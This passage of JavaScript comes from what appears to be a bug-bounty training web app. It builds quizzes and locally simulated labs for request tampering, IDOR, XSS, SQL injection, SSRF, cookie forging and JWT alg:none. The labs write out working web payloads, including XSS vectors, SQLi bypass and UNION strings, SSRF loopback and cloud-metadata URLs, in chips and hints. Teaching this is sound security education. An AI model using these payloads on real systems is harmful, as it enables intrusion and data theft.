  if(l.type==="lab"||l.type==="ctf")buildLab(l,c);
  if(l.type==="quiz")buildQuiz(l,c);
  buildCompleteBar(l,c);
  syncActive();
  $("#main").scrollTop=0;
}

function buildCompleteBar(l,c){
  const bar=el("div","complete-bar");
  const idx=ALL.findIndex(x=>x.id===l.id);
  const next=ALL[idx+1];
  if(l.type==="theory"){
    const b=el("button","btn",done.has(l.id)?t("l.marked"):t("l.mark"));
    if(done.has(l.id)){b.classList.add("ghost");}
    b.onclick=()=>{markDone(l.id);b.textContent=t("l.marked");b.classList.add("ghost");};
    bar.appendChild(b);
  } else {
    const status=el("div","",done.has(l.id)
      ?'<span style="color:var(--ok);font-family:var(--mono);font-size:12px">'+esc(t("l.solved"))+'</span>'
      :'<span style="color:var(--muted);font-family:var(--mono);font-size:12px">'+esc(t("l.solve"))+'</span>');
    bar.appendChild(status);
  }
  if(next){
    const nb=el("button","btn ghost next-btn",esc(t("l.next"))+" "+esc(next.title)+" →");
    nb.onclick=()=>openLesson(next.id);
    bar.appendChild(nb);
  } else {
    const nb=el("button","btn ghost next-btn",esc(t("l.back")));
    nb.onclick=()=>{currentLesson=null;renderHome();syncActive();};
    bar.appendChild(nb);
  }
  c.appendChild(bar);
}

function markDone(id){
  if(done.has(id))return;
  done.add(id);save();renderStats();renderSidebarRings();syncActive();
  // light celebration via rank bump handled by renderStats
}
function renderSidebarRings(){
  document.querySelectorAll(".mod").forEach(w=>{
    const mi=+w.dataset.mi;const ring=w.querySelector(".mod-ring");
    if(ring)ring.innerHTML=ringSVG(modPct(mi));
  });
}

/* ============================================================
   QUIZ
   ============================================================ */
function buildQuiz(l,c){
  l.quiz.forEach((item,qi)=>{
    const box=el("div","quiz");
    box.innerHTML=`<div class="q">${qi+1}. ${esc(item.q)}</div>`;
    const explain=el("div","explain",esc(item.ex));
    item._ok=false;
    item.opts.forEach((o,oi)=>{
      const b=el("button","opt",esc(o));
      b.onclick=()=>{
        if(item._ok)return;
        if(oi===item.a){b.classList.add("correct");item._ok=true;explain.classList.add("show");checkQuizDone(l);}
        else{b.classList.add("wrong");explain.classList.add("show");}
      };
      box.appendChild(b);
    });
    box.appendChild(explain);
    c.appendChild(box);
  });
}
function checkQuizDone(l){
  if(l.quiz.every(q=>q._ok))markDone(l.id);
}

/* ============================================================
   LABS & CTFs  (all local simulations)
   ============================================================ */
function flagReveal(host,flag){
  const d=el("div","flag-reveal",'★ FLAG CAPTURED &nbsp; '+esc(flag));
  host.appendChild(d);
}
function flagBox(l,c,validator){
  // validator(value) -> {ok:bool, flag?:string, msg?:string}
  const zone=el("div","flagzone");
  zone.innerHTML=`<div class="ft">▸ Submit flag</div>
    <div class="flaginput"><input type="text" placeholder="FLAG{...}" autocomplete="off" spellcheck="false"><button class="btn">Submit</button></div>
    <div class="flagmsg"></div>`;
  const input=zone.querySelector("input"),btn=zone.querySelector("button"),msg=zone.querySelector(".flagmsg");
  const submit=()=>{
    const res=validator(input.value.trim());
    if(res.ok){
      msg.className="flagmsg good";msg.textContent="✓ Correct! "+(res.msg||"Challenge solved.");
      markDone(l.id);input.disabled=true;btn.disabled=true;
      // update status line if present
      const st=document.querySelector(".complete-bar div span");
      if(st){st.style.color="var(--ok)";st.textContent="✓ Solved — XP awarded";}
    } else {
      msg.className="flagmsg bad";msg.textContent="✗ "+(res.msg||"Not quite. Try again.");
    }
  };
  btn.onclick=submit;
  input.addEventListener("keydown",e=>{if(e.key==="Enter")submit();});
  c.appendChild(zone);
}
function b64decoder(c,label){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>${label||'base64 decoder'}</div>
  <div class="lab-body">
    <label>input</label><input type="text" class="d-in" placeholder="paste base64 here" spellcheck="false">
    <div class="btn-row"><button class="btn b-dec">Decode</button><button class="btn ghost b-enc">Encode</button></div>
    <div class="lab-out">output appears here</div>
  </div>`;
  const inp=box.querySelector(".d-in"),out=box.querySelector(".lab-out");
  box.querySelector(".b-dec").onclick=()=>{try{out.textContent=atob(inp.value.trim())||"(empty)";}catch(e){out.innerHTML='<span class="bad">invalid base64</span>';}};
  box.querySelector(".b-enc").onclick=()=>{try{out.textContent=btoa(inp.value);}catch(e){out.innerHTML='<span class="bad">cannot encode</span>';}};
  c.appendChild(box);
}

function buildLab(l,c){
  const map={intercept:labIntercept,idor:labIdor,xss:labXss,sqli:labSqli,ssrf:labSsrf,
             jsrecon:labJsRecon,rolecookie:labRoleCookie,jwt:labJwt,secret:labSecret,
             massassign:labMassAssign,domxss:labDomXss,csrf:labCsrf,race:labRace,cors:labCors,takeover:labTakeover,
             osi:labOsi,subnet:labSubnet,ports:labPorts,dns:labDns,journey:labJourney};
  (map[l.lab]||(()=>{}))(l,c);
}

/* ---- Lab: HTTP intercept & tamper (Module 1) ---- */
function labIntercept(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>Burp · Repeater (simulated)</div>
  <div class="lab-body">
    <label>intercepted request — edit it freely</label>
    <textarea rows="9" spellcheck="false">POST /api/checkout HTTP/2
Host: shop.example.com
Cookie: session=a1b2c3d4e5
Content-Type: application/json

{"item":"Pro License","price":199,"role":"user"}</textarea>
    <div class="btn-row"><button class="btn send">▶ Send to server</button>
      <button class="chip reset">reset</button></div>
    <div class="lab-out">Edit the request, then send it.</div>
  </div>`;
  const ta=box.querySelector("textarea"),out=box.querySelector(".lab-out"),orig=box.querySelector("textarea").value;
  box.querySelector(".reset").onclick=()=>{ta.value=orig;out.textContent="Edit the request, then send it.";};
  box.querySelector(".send").onclick=()=>{
    const body=ta.value.split(/\n\s*\n/)[1]||"";
    let price=null,role=null;
    try{const j=JSON.parse(body.trim());price=j.price;role=(j.role||"").toLowerCase();}
    catch(e){
      const pm=body.match(/"price"\s*:\s*(-?\d+(?:\.\d+)?)/);const rm=body.match(/"role"\s*:\s*"([^"]*)"/);
      if(pm)price=parseFloat(pm[1]);if(rm)role=rm[1].toLowerCase();
    }
    if(price===null){out.innerHTML='<span class="bad">HTTP/2 400 Bad Request</span>\nCould not parse JSON body.';return;}
    const freeish=Number(price)<=0;
    const admin=role==="admin";
    if(freeish&&admin){
      out.innerHTML='<span class="ok">HTTP/2 200 OK</span>\n{"status":"confirmed","charged":'+price+',"role":"admin",\n "flag":"<span class="hl">FLAG{client_side_trust_is_no_trust}</span>"}';
      flagReveal(out.parentElement,"FLAG{client_side_trust_is_no_trust}");
      markDone(l.id);
    } else if(freeish){
      out.innerHTML='<span class="ok">HTTP/2 200 OK</span>\n{"status":"confirmed","charged":'+price+',"role":"'+esc(role||'user')+'"}\n\n<span class="hl">Nice — you got it free. Now also escalate your role to admin in the same request.</span>';
    } else if(admin){
      out.innerHTML='<span class="ok">HTTP/2 200 OK</span>\n{"status":"confirmed","charged":'+price+',"role":"admin"}\n\n<span class="hl">Role escalated! But you still paid '+price+'. Drop the price to 0 as well.</span>';
    } else {
      out.innerHTML='<span class="ok">HTTP/2 200 OK</span>\n{"status":"confirmed","charged":'+esc(price)+',"role":"'+esc(role||'user')+'"}\n\nServer trusted your values. Try tampering price and role.';
    }
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">The server blindly trusts the JSON body. Change <code>"price":199</code> to <code>"price":0</code> and <code>"role":"user"</code> to <code>"role":"admin"</code>, then send. Both at once reveals the flag.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: IDOR invoice enumeration (Module 3) ---- */
function labIdor(l,c){
  const invoices={
    1024:{owner:"you (customer)",amount:"€49.00",item:"Pro License",note:"your own invoice"},
    1023:{owner:"maria.k@example.com",amount:"€49.00",item:"Pro License",note:"another customer — you shouldn't see this!"},
    1022:{owner:"nikos.p@example.com",amount:"€129.00",item:"Team Plan",note:"another customer"},
    1001:{owner:"billing@example.com",amount:"€0.00",item:"Internal",note:"internal account"},
    1000:{owner:"admin@example.com",amount:"€0.00",item:"ADMIN EXPORT",note:"FLAG{idor_horizontal_to_admin_pwned}",flag:true}
  };
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>GET /api/invoice?id=… (session: you)</div>
  <div class="lab-body">
    <label>invoice id</label>
    <div class="btn-row" style="margin-bottom:10px">
      <button class="chip dec">– 1</button>
      <input type="number" value="1024" style="max-width:120px;margin:0">
      <button class="chip inc">+ 1</button>
      <button class="btn fetch">Fetch</button>
    </div>
    <div class="lab-out">Your invoice is #1024. What if you ask for a different id?</div>
  </div>`;
  const inp=box.querySelector("input"),out=box.querySelector(".lab-out");
  box.querySelector(".inc").onclick=()=>{inp.value=(+inp.value+1);};
  box.querySelector(".dec").onclick=()=>{inp.value=(+inp.value-1);};
  box.querySelector(".fetch").onclick=()=>{
    const id=+inp.value;const inv=invoices[id];
    if(!inv){out.innerHTML='<span class="bad">HTTP 404</span> {"error":"invoice not found"}\n(No access check though — keep enumerating low numbers…)';return;}
    let html='<span class="ok">HTTP 200 OK</span>\n';
    html+='<div class="data-row"><span>invoice</span><span>#'+id+'</span></div>';
    html+='<div class="data-row"><span>owner</span><span>'+esc(inv.owner)+'</span></div>';
    html+='<div class="data-row"><span>item</span><span>'+esc(inv.item)+'</span></div>';
    html+='<div class="data-row"><span>amount</span><span>'+esc(inv.amount)+'</span></div>';
    if(inv.flag){
      html+='<div class="data-row"><span>export_token</span><span class="hl">'+esc(inv.note)+'</span></div>';
      out.innerHTML=html;flagReveal(out,inv.note);markDone(l.id);
    } else {
      html+='<div class="data-row"><span>note</span><span>'+esc(inv.note)+'</span></div>';
      out.innerHTML=html;
    }
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">The server never checks that the invoice belongs to you. Walk the IDs downward — real systems often keep admin/internal accounts at the <em>lowest</em> numbers. Try the round numbers near 1000.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: reflected XSS playground (sandboxed) (Module 4) ---- */
function labXss(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>vulnerable-search.example (sandboxed)</div>
  <div class="lab-body">
    <label>search query — reflected into the page unescaped</label>
    <input type="text" class="xin" value="laptop" spellcheck="false">
    <div class="chips">
      <span class="chip" data-p="&lt;img src=x onerror=&quot;parent.postMessage('xss-fired','*')&quot;&gt;">img onerror</span>
      <span class="chip" data-p="&lt;svg onload=&quot;parent.postMessage('xss-fired','*')&quot;&gt;">svg onload</span>
      <span class="chip" data-p="&lt;script&gt;parent.postMessage('xss-fired','*')&lt;/script&gt;">script tag</span>
    </div>
    <div class="btn-row"><button class="btn run">▶ Search</button></div>
    <label style="margin-top:12px">rendered result (live, sandboxed iframe)</label>
    <iframe class="frame" sandbox="allow-scripts"></iframe>
    <div class="lab-out">Type a payload that executes JavaScript. The chips above are starting points.</div>
  </div>`;
  const inp=box.querySelector(".xin"),frame=box.querySelector(".frame"),out=box.querySelector(".lab-out");
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>{
    // decode the HTML entities in data-p into a real payload string
    const tmp=document.createElement("textarea");tmp.innerHTML=ch.dataset.p;inp.value=tmp.value;
  });
  let fired=false;
  function run(){
    const q=inp.value;
    // the "vulnerable server" reflects input straight into HTML — no escaping
    const doc='<!doctype html><meta charset="utf-8"><body style="font:14px system-ui;margin:8px;color:#111">'
      +'<h3 style="margin:.2em 0">Search results</h3><p>Results for: '+q+'</p>'
      +'<p style="color:#888">0 products found.</p></body>';
    frame.srcdoc=doc;
    out.innerHTML='Reflecting: <span class="hl">'+esc(q)+'</span>\nIf your script runs, the page will catch it…';
  }
  box.querySelector(".run").onclick=run;
  inp.addEventListener("keydown",e=>{if(e.key==="Enter")run();});
  window.addEventListener("message",e=>{
    if(e.data==="xss-fired"&&!fired&&currentLesson===l.id){
      fired=true;
      out.innerHTML='<span class="ok">● XSS EXECUTED — your JavaScript ran inside the page origin.</span>\nThat postMessage came from code the "server" reflected. In a real target this could steal the session cookie.';
      flagReveal(out,"FLAG{reflected_xss_executed}");
      markDone(l.id);
    }
  });
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Your text is dropped straight into HTML. Close nothing, just inject a tag that runs code. The <code>&lt;img src=x onerror=...&gt;</code> trick fires because the image fails to load — it works even when <code>&lt;script&gt;</code> is filtered. Click a chip to load it, then Search.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: SQLi login bypass + UNION (Module 5) ---- */
function labSqli(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>login.example — raw SQL (simulated)</div>
  <div class="lab-body">
    <label>stage 1 · login (query built by string concatenation)</label>
    <input type="text" class="u" placeholder="username" value="admin" spellcheck="false">
    <input type="text" class="p" placeholder="password" value="guess" spellcheck="false">
    <div class="lab-out q-prev" style="margin:0 0 10px">SELECT * FROM users WHERE user='admin' AND pass='guess'</div>
    <div class="btn-row"><button class="btn login">Log in</button>
      <button class="chip" data-f="u" data-v="admin'-- ">payload: admin'-- </button>
      <button class="chip" data-f="u" data-v="' OR '1'='1">payload: ' OR '1'='1</button>
    </div>
    <div class="lab-out out1">Enter credentials, or inject into the username.</div>
    <label style="margin-top:16px">stage 2 · product search (UNION-injectable, reflects rows)</label>
    <input type="text" class="s" placeholder="search products" value="phone" spellcheck="false">
    <div class="btn-row"><button class="btn search">Search</button>
      <button class="chip" data-f="s" data-v="' UNION SELECT username,password FROM secrets-- ">payload: UNION SELECT … FROM secrets</button>
    </div>
    <div class="lab-out out2">Search returns product rows. Can you make it return another table?</div>
  </div>`;
  const u=box.querySelector(".u"),p=box.querySelector(".p"),s=box.querySelector(".s");
  const qprev=box.querySelector(".q-prev"),out1=box.querySelector(".out1"),out2=box.querySelector(".out2");
  function upd(){qprev.textContent="SELECT * FROM users WHERE user='"+u.value+"' AND pass='"+p.value+"'";}
  u.addEventListener("input",upd);p.addEventListener("input",upd);upd();
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>{
    const f=ch.dataset.f,v=ch.dataset.v;
    if(f==="u"){u.value=v;upd();}else{s.value=v;}
  });
  const tautology=/'\s*(or|\|\|)\s*('?\s*1\s*'?\s*=\s*'?\s*1|'[^']*'\s*=\s*'[^']*'|\d+\s*=\s*\d+)/i;
  const comment=/'(\s*)(--|#)/;
  box.querySelector(".login").onclick=()=>{
    const uv=u.value;
    const bypass=tautology.test(uv)||comment.test(uv);
    if(bypass){
      out1.innerHTML='<span class="ok">● Login bypassed — authenticated as admin.</span>\nYour injection turned the WHERE clause always-true (or commented out the password check).\n<div class="data-row"><span>flag</span><span class="hl">FLAG{sqli_auth_bypass}</span></div>';
      flagReveal(out1,"FLAG{sqli_auth_bypass}");markDone(l.id);
    } else {
      out1.innerHTML='<span class="bad">Login failed</span> — no matching row. Try injecting a tautology or a comment into the username.';
    }
  };
  box.querySelector(".search").onclick=()=>{
    const sv=s.value.toLowerCase();
    if(/union\s+select/.test(sv)&&/secrets/.test(sv)){
      out2.innerHTML='<span class="ok">● UNION injection succeeded — dumping secrets table:</span>\n'
        +'<div class="data-row"><span>admin</span><span>$2y$10$Xk...bcrypt...</span></div>'
        +'<div class="data-row"><span>backup_svc</span><span>hunter2</span></div>'
        +'<div class="data-row"><span>_flag</span><span class="hl">FLAG{union_based_data_exfiltration}</span></div>';
      flagReveal(out2,"FLAG{union_based_data_exfiltration}");markDone(l.id);
    } else if(/union\s+select/.test(sv)){
      out2.innerHTML='<span class="hl">Column count matched, but wrong table.</span> The hidden table is called <code>secrets</code>. Target it: <code>UNION SELECT username,password FROM secrets-- </code>';
    } else {
      out2.innerHTML='Showing products matching "'+esc(s.value)+'": (2 results)\n'
        +'<div class="data-row"><span>Phone X</span><span>€599</span></div>'
        +'<div class="data-row"><span>Phone Mini</span><span>€399</span></div>\n'
        +'<span style="color:var(--muted)">Two columns are displayed. Hint: UNION SELECT needs the same column count.</span>';
    }
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc"><strong>Stage 1:</strong> inject <code>admin'-- </code> into username — the <code>--</code> comments out the <code>AND pass</code> check. Or <code>' OR '1'='1</code> to make it always true. <strong>Stage 2:</strong> the search shows 2 columns, so <code>' UNION SELECT username,password FROM secrets-- </code> appends the hidden table.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: SSRF filter bypass (Module 6) ---- */
function labSsrf(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>url-preview.example — fetches any URL (simulated)</div>
  <div class="lab-body">
    <label>URL to preview (blocklist rejects literal "localhost" / "127.0.0.1")</label>
    <input type="text" class="url" value="https://example.com" spellcheck="false">
    <div class="chips">
      <span class="chip">http://127.1/admin</span>
      <span class="chip">http://[::1]:8080/admin</span>
      <span class="chip">http://2130706433:8080/admin</span>
      <span class="chip">http://169.254.169.254/latest/meta-data/</span>
    </div>
    <div class="btn-row"><button class="btn fetch">▶ Fetch & preview</button></div>
    <div class="lab-out">Public URLs just return a boring preview. Reach an internal service to win.</div>
  </div>`;
  const inp=box.querySelector(".url"),out=box.querySelector(".lab-out");
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>inp.value=ch.textContent);
  function hostOf(u){try{let h=new URL(u).hostname;return h.replace(/^\[|\]$/g,"");}catch(e){return null;}}
  function isLoopback(h){
    if(!h)return false;h=h.toLowerCase();
    if(["127.0.0.1","::1","0.0.0.0","127.1","127.0.1"].includes(h))return true;
    if(h==="2130706433")return true;              // decimal 127.0.0.1
    if(/^127(\.\d+){0,2}$/.test(h))return true;   // 127.1 , 127.0.1
    if(h.endsWith(".nip.io")||h.endsWith(".localtest.me"))return true;
    return false;
  }
  box.querySelector(".fetch").onclick=()=>{
    const raw=inp.value.trim();const low=raw.toLowerCase();
    // naive blocklist, exactly as a lazy dev would write it
    if(low.includes("localhost")||low.includes("127.0.0.1")){
      out.innerHTML='<span class="bad">403 Blocked by SSRF filter</span>\nURL contains a banned string ("localhost"/"127.0.0.1"). Find another way to say "loopback"…';return;
    }
    const h=hostOf(raw);
    if(!h){out.innerHTML='<span class="bad">400 Invalid URL</span>';return;}
    if(h==="169.254.169.254"){
      out.innerHTML='<span class="ok">● Reached cloud metadata service (169.254.169.254)!</span>\nThe blocklist never considered the metadata IP.\n'
        +'<div class="data-row"><span>iam/role</span><span>app-prod-role</span></div>'
        +'<div class="data-row"><span>AccessKeyId</span><span>AKIA................</span></div>'
        +'<div class="data-row"><span>_flag</span><span class="hl">FLAG{ssrf_to_cloud_metadata}</span></div>';
      flagReveal(out,"FLAG{ssrf_to_cloud_metadata}");markDone(l.id);return;
    }
    if(isLoopback(h)){
      out.innerHTML='<span class="ok">● Reached the internal admin panel on localhost!</span>\nYou bypassed the string filter with an alternate loopback encoding.\n'
        +'<div class="data-row"><span>GET /admin</span><span>200 OK</span></div>'
        +'<div class="data-row"><span>_flag</span><span class="hl">FLAG{ssrf_loopback_filter_bypass}</span></div>';
      flagReveal(out,"FLAG{ssrf_loopback_filter_bypass}");markDone(l.id);return;
    }
    out.innerHTML='<span class="ok">200 OK</span> Preview of '+esc(h)+':\n"'+esc(h)+' — a normal public website." Nothing sensitive here. Aim at an internal target.';
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">The filter only blocks the exact strings <code>localhost</code> and <code>127.0.0.1</code>. But <code>127.1</code>, <code>[::1]</code>, and decimal <code>2130706433</code> all mean loopback too. And the cloud metadata IP <code>169.254.169.254</code> isn't on their blocklist at all — easiest win.</div>`;
  c.appendChild(hint);
}

/* ---- CTF: read the JS bundle (Module 2) ---- */
function labJsRecon(l,c){
  b64decoder(c,"base64 decoder (atob)");
  flagBox(l,c,v=>{
    const want=b64(l.flag);
    if(!v)return{ok:false,msg:"Enter the decoded flag."};
    if(v===want)return{ok:true,msg:"You read the bundle like a hunter."};
    if(v.replace(/\s/g,"")===want)return{ok:true};
    return{ok:false,msg:"Not the right value. Decode the atob() string from the bundle."};
  });
}

/* ---- CTF: forge role cookie (Module 3) ---- */
function labRoleCookie(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>cookie forge workbench</div>
  <div class="lab-body">
    <label>decode a cookie value</label>
    <input type="text" class="din" value="eyJ1aWQiOjEwMjQsInJvbGUiOiJ1c2VyIn0" spellcheck="false">
    <div class="btn-row"><button class="btn ddec">Decode</button><button class="btn ghost denc">Encode text → base64</button></div>
    <div class="lab-out dout">Decode the session cookie, then edit + re-encode the JSON.</div>
  </div>`;
  const din=box.querySelector(".din"),dout=box.querySelector(".dout");
  box.querySelector(".ddec").onclick=()=>{try{dout.textContent=atob(din.value.trim());}catch(e){dout.innerHTML='<span class="bad">invalid base64</span>';}};
  box.querySelector(".denc").onclick=()=>{try{dout.textContent=btoa(din.value);}catch(e){dout.innerHTML='<span class="bad">cannot encode</span>';}};
  c.appendChild(box);
  flagBox(l,c,v=>{
    if(!v)return{ok:false,msg:"Submit your forged base64 cookie value."};
    let dec;try{dec=atob(v.trim());}catch(e){return{ok:false,msg:"That's not valid base64. Encode your JSON first."};}
    let j;try{j=JSON.parse(dec);}catch(e){return{ok:false,msg:"Decoded value isn't valid JSON. Keep the {...} structure."};}
    if(j.uid===1024&&String(j.role).toLowerCase()==="admin")
      return{ok:true,flag:"FLAG{client_side_role_forged}",msg:"Admin role forged — the server trusted your cookie."};
    if(j.uid===1024)return{ok:false,msg:'Valid cookie, but role is still "'+esc(j.role)+'". Set it to admin.'};
    return{ok:false,msg:"Keep uid=1024 and set role to admin."};
  });
  // override reveal flag text for this CTF
}

/* ---- CTF: forge JWT alg:none (Module 7) ---- */
function labJwt(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>JWT decoder / forge workbench</div>
  <div class="lab-body">
    <label>paste a JWT to decode its header + payload</label>
    <input type="text" class="jin" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjQsInJvbGUiOiJ1c2VyIn0.c2ln" spellcheck="false">
    <div class="btn-row"><button class="btn jdec">Decode</button>
      <button class="chip" data-t="header">encode header →</button>
      <button class="chip" data-t="payload">encode payload →</button>
    </div>
    <input type="text" class="jraw" placeholder='type JSON here to base64url-encode, e.g. {"alg":"none"}' spellcheck="false" style="margin-top:10px">
    <div class="lab-out jout">Decode the token. Then base64url-encode a forged header and payload, and join them as header.payload. (trailing dot, empty signature).</div>
  </div>`;
  const jin=box.querySelector(".jin"),jraw=box.querySelector(".jraw"),jout=box.querySelector(".jout");
  const b64u=s=>btoa(s).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");
  const b64ud=s=>{s=s.replace(/-/g,"+").replace(/_/g,"/");while(s.length%4)s+="=";return b64(s);};
  box.querySelector(".jdec").onclick=()=>{
    const parts=jin.value.trim().split(".");
    if(parts.length<2){jout.innerHTML='<span class="bad">Not a JWT (need header.payload.signature)</span>';return;}
    jout.textContent="header:  "+(b64ud(parts[0])||"(?)")+"\npayload: "+(b64ud(parts[1])||"(?)")+"\nsignature: "+(parts[2]||"(none)");
  };
  box.querySelectorAll(".chip").forEach(ch=>ch.onclick=()=>{
    if(!jraw.value.trim()){jout.innerHTML='<span class="bad">Type some JSON in the field first.</span>';return;}
    jout.textContent=ch.dataset.t+" (base64url): "+b64u(jraw.value.trim());
  });
  c.appendChild(box);
  flagBox(l,c,v=>{
    const parts=v.trim().replace(/\.$/,"").split(".");
    if(parts.length<2)return{ok:false,msg:"Submit a forged token as header.payload. (with a trailing dot / empty signature)."};
    let H,P;try{H=JSON.parse(b64ud(parts[0]));P=JSON.parse(b64ud(parts[1]));}
    catch(e){return{ok:false,msg:"Could not decode your header/payload as JSON. Use the encoder above."};}
    const algNone=String(H.alg||"").toLowerCase()==="none";
    const admin=String(P.role||"").toLowerCase()==="admin";
    if(algNone&&admin)return{ok:true,flag:"FLAG{jwt_alg_none_forged}",msg:"Unsigned admin token accepted — classic alg:none."};
    if(!algNone)return{ok:false,msg:'Header alg must be "none" (you sent "'+esc(H.alg)+'").'};
    return{ok:false,msg:'alg:none is set, but payload role is "'+esc(P.role)+'". Set role to admin.'};
  });
}

/* ---- CTF: exposed secret (Module 8) ---- */
function labSecret(l,c){
  b64decoder(c,"base64 decoder");
  flagBox(l,c,v=>{
    const want=b64(l.flag);
    if(!v)return{ok:false,msg:"Decode LEGACY_EXPORT_TOKEN and submit it."};
    if(v.trim()===want)return{ok:true,msg:"Exposed .env files really are free money."};
    return{ok:false,msg:"Not it — decode the base64 LEGACY_EXPORT_TOKEN value."};
  });
}

/* ============================================================
   THEME
   ============================================================ */
function applyTheme(t){
  if(t==="light")document.documentElement.setAttribute("data-theme","light");
  else if(t==="dark")document.documentElement.setAttribute("data-theme","dark");
  else document.documentElement.removeAttribute("data-theme");
}
(function initTheme(){
  let t=null;try{t=localStorage.getItem("firstbounty.theme");}catch(e){}
  if(t)applyTheme(t);
  $("#themeToggle").onclick=()=>{
    const cur=document.documentElement.getAttribute("data-theme");
    const mqDark=matchMedia("(prefers-color-scheme:dark)").matches;
    let next;
    if(!cur)next=mqDark?"light":"dark";
    else if(cur==="dark")next="light";
    else next="dark";
    applyTheme(next);
    try{localStorage.setItem("firstbounty.theme",next);}catch(e){}
  };
})();

/* ============================================================
   NEW ADVANCED LABS (all local simulations)
   ============================================================ */

/* ---- Lab: mass assignment (Module 3) ---- */
function labMassAssign(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>PATCH /api/users/1024 (simulated)</div>
  <div class="lab-body">
    <label>request body — the server binds every field you send</label>
    <textarea rows="4" spellcheck="false">{"name":"Stavros","email":"me@example.com"}</textarea>
    <div class="btn-row"><button class="btn send">▶ Save profile</button>
      <button class="chip add">+ add a field</button></div>
    <div class="lab-out">The UI only lets you edit name & email. But the API accepts raw JSON…</div>
  </div>`;
  const ta=box.querySelector("textarea"),out=box.querySelector(".lab-out");
  box.querySelector(".add").onclick=()=>{
    try{const j=JSON.parse(ta.value);j.isAdmin=false;ta.value=JSON.stringify(j);}catch(e){ta.value=ta.value.replace(/\}\s*$/,',"isAdmin":false}');}
  };
  box.querySelector(".send").onclick=()=>{
    let j;try{j=JSON.parse(ta.value);}catch(e){out.innerHTML='<span class="bad">HTTP 400</span> invalid JSON body.';return;}
    const esc2=k=>String(j[k]).toLowerCase();
    const admin=(j.isAdmin===true)||(j.is_admin===true)||(j.admin===true)||(("role"in j)&&esc2("role")==="admin");
    if(admin){
      out.innerHTML='<span class="ok">HTTP 200 OK</span>\n{"id":1024,"name":"'+esc(j.name||"")+'","role":"admin","isAdmin":true}\n\n<span class="hl">The server bound your extra field straight to the user object. You are now admin.</span>';
      flagReveal(out,"FLAG{mass_assignment_privilege_grant}");markDone(l.id);
    } else {
      out.innerHTML='<span class="ok">HTTP 200 OK</span>\n{"id":1024,"name":"'+esc(j.name||"")+'","role":"user"}\n\nSaved. Still a normal user — try sending a field the form never showed you (think: isAdmin, role).';
    }
  };
  c.appendChild(box);
  const hint=el("details","hintbox");
  hint.innerHTML=`<summary>Need a hint?</summary><div class="hc">Add <code>"isAdmin":true</code> (or <code>"role":"admin"</code>) to the JSON and save. The server trusts whatever keys arrive. The <em>+ add a field</em> button scaffolds it for you — just flip it to true.</div>`;
  c.appendChild(hint);
}

/* ---- Lab: DOM-based XSS (Module 4) ---- */
function labDomXss(l,c){
  const box=el("div","lab");
  box.innerHTML=`<div class="lab-bar"><span class="dots"><span class="dot" style="background:var(--crit)"></span><span class="dot" style="background:var(--med)"></span><span class="dot" style="background:var(--ok)"></span></span>profile.example/#section=… (sandboxed)</div>
  <div class="lab-body">
    <label>URL fragment value (the app sinks this into innerHTML)</label>
    <input type="text" class="din" value="overview" spellcheck="false">
    <div class="chips">
      <span class="chip" data-p="&lt;img src=x onerror=&quot;parent.postMessage('dom-xss','*')&quot;&gt;">img onerror</span>
      <span class="chip" data-p="&lt;svg onload=&quot;parent.postMessage('dom-xss','*')&quot;&gt;">svg onload</span>
      <span class="chip" data-p="&lt;script&gt;parent.postMessage('dom-xss','*')&lt;/script&gt;">script (won't run via innerHTML)</span>
    </div>
    <div class="btn-row"><button class="btn run">▶ Load fragment</button></div>
    <label style="margin-top:12px">page JS: <code>out.innerHTML = "Section: " + location.hash</code></label>
    <iframe class="frame" sandbox="allow-scripts"></iframe>
    <div class="lab-out">The fragment is written into the DOM with innerHTML. Make it execute.</div>
  </div>`;
